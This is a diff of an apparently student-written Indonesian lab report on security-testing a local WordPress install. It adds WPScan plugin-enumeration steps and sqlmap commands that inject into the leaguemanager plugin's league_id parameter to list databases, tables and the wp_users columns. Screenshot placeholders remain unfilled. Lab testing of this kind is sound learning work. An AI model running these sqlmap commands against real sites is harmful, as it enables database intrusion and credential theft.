@@ -77,15 +77,30 @@ sudo systemctl start apache2
 
 #### Uji WPScan
 1. Update terlebih dahulu database WPScan dengan perintah `ruby wpscan.rb --update`.
-2. Jalankan perintah `wpscan -u [alamat_wordpress] --enumerate vp`, contoh: `ruby wpscan.rb --u http://localhost/wordpress --enumerate vp`.
+2. Jalankan perintah `wpscan -u [alamat_wordpress] --enumerate vp`, contoh: `ruby wpscan.rb --u http://localhost/ --enumerate vp`. alamat localhost ; 10.0.2.15
 3. Output :
-![WPScan](Hasil%20WPScan/WPScan%201.png)
-![WPScan](Hasil%20WPScan/WPScan%202.png)
-![WPScan](Hasil%20WPScan/WPScan%203.png)
+4. ### tambah gambar yo
+
 
 
 #### Uji sqlmap
-1. Jalankan perintah 
+1. Isikan terlebih dahulu data di leaguemanager.
+2. Buka halaman plugin leaguemanager http://10.0.2.15/wp-admin/admin.php?page=leaguemanager.
+3. Isi nama league kemudian klik tambah
+4. Masuk ke terminal dan jalankan perintah `sqlmap -u "http://10.0.2.15/wp-admin/admin.php?league_id=2" --dbs `. Perintah ini digunakan untuk mencari tahu database apa yang digunakan.
+5. ### tambah gambar yo
+5. hasil output : 
+6. ### tambah gambar yo
+7. Untuk mengetahui tabel apa saja yang ada dalamnya jalankan perintah `sqlmap -u "http://10.0.2.15/wp-admin/admin.php?league_id=2" --dbms mysql --table`
+8. ### tambah gambar yo
+9. hasil output :
+10. ### tambah gambar yo
+11. Untuk mengetahui colom apa saja yang ada di tabel wp-users database wordpress dengan menjalankan perintah `sqlmap -u "http://10.0.2.15/wp-admin/admin.php?league_id=2" --dbms mysql --columns -D wordpress -T wp_users`
+12.  ### tambah gambar yo
+13.  hasil output : 
+14.  ### tambah gambar yo
+
 
 ## Kesimpulan dan Saran
-1. blabla
+1. Tools WPScan dapat mengetahui celah keamanan wordpress yang dapat di tembus
+2. 
